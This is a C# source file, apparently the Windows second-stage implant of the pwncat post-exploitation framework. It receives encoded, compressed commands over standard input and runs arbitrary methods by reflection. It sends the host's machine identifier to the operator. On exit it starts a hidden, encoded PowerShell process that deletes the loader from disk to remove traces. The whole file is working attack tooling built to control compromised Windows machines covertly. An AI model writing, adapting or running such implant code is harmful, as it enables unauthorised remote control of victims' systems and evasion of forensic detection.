using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.Win32;
using System.Web.Script.Serialization;
using System.Collections.Generic;
using System.Text;

namespace stagetwo
{
    public class StageTwo
    {

        public static bool Running = true;

        public static System.String ReadUntilLine(System.String delimeter)
        {
            System.Text.StringBuilder builder = new System.Text.StringBuilder();

            while (true)
            {
                System.String line = System.Console.ReadLine();
                if (line == delimeter)
                {
                    break;
                }
                builder.AppendLine(line);
            }

            return builder.ToString();
        }

        public static string BuildResponse<T>(T[] results, Dictionary<string, string> error)
        {
            var response_dict = new Dictionary<string, object>
            {
                { "result", results },
                { "error", error }
            };

            var serializer = new JavaScriptSerializer();
            var response_json = serializer.Serialize(response_dict);

            var stream = new System.IO.MemoryStream();
            var gz = new System.IO.Compression.GZipStream(stream, System.IO.Compression.CompressionMode.Compress);
            gz.Write(System.Text.Encoding.UTF8.GetBytes(response_json), 0, response_json.Length);
            gz.Close();

            return System.Convert.ToBase64String(stream.ToArray());
        }

        public void ParseRequest()
        {
            // Each request is a base64-encoded line containing a gzip-compressed request
            var stream = new System.IO.MemoryStream(System.Convert.FromBase64String(System.Console.ReadLine()));
            var gz = new System.IO.Compression.GZipStream(stream, System.IO.Compression.CompressionMode.Decompress);
            var request = new System.IO.MemoryStream();
            gz.CopyTo(request);
            gz.Close();

            request.Seek(0, SeekOrigin.Begin);

            // We use a stream reader to grab the two strings at the beginning of the request
            var reader = new System.IO.StreamReader(request, System.Text.Encoding.UTF8);
            var type_name = reader.ReadLine();
            var method_name = reader.ReadLine();
            var type = GetType().Assembly.GetType("stagetwo." + type_name);

            // Locate the specified type
            if (type == null)
            {
                System.Console.WriteLine(BuildResponse<string>(null, new Dictionary<string, string>{
                    { "message", "invalid type name: " + type_name }
                }));
                return;
            }

            // Locate the specified method
            var method = type.GetMethod(method_name);
            if (method == null)
            {
                System.Console.WriteLine(BuildResponse<string>(null, new Dictionary<string, string>{
                    { "message", "invalid method for " + type_name }
                }));
            }

            request.Seek(type_name.Length + method_name.Length + 2, SeekOrigin.Begin);

            // Invoke the method with the request stream
            method.Invoke(null, new object[] { request });
        }

        public static void test(MemoryStream stream)
        {
            var reader = new StreamReader(stream);

            System.Console.WriteLine(BuildResponse(new string[] { reader.ReadLine() }, null));
        }

        public void main(object oPath, object oStdin)
        {
            string path = (string)oPath;
            System.IO.StreamReader stdin = (System.IO.StreamReader)oStdin;
            object[] args = new object[] { stdin };
            var protocol = new Protocol(stdin);

            // Initialize ConsoleHost and PowerShell Runspace
            PowerShell.init_pshost();

            // Tell pwncat we are ready
            System.Console.WriteLine("READY");

            // Send the host identifier
            System.Console.WriteLine((string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "NONE"));

            // Run the main loop
            protocol.Loop();

            // Delete the loader after we exit
            string command = "try { while( $true ) { Get-Process -Id " + System.Diagnostics.Process.GetCurrentProcess().Id + " -ErrorAction Stop | out-null; sleep 1 } } catch { ri -force -path \"" + path + "\"; }";
            command = Convert.ToBase64String(Encoding.Unicode.GetBytes(command));

            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
            {
                FileName = "powershell.exe",
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                Arguments = "-win hidden -nopro -enc " + command,
            });

            // I believe that the consolehost is running threads in non-background mode.
            // I can't figure out a sane way to stop them, so this just force closes everything.
            Environment.Exit(Environment.ExitCode);
        }

        public static Dictionary<string, object> exit()
        {
            throw new Protocol.LoopExit();
        }

        public static void Main(string[] args)
        {
            var x = new StageTwo();
            x.main("", new StreamReader(System.Console.OpenStandardInput()));
        }

    }

}
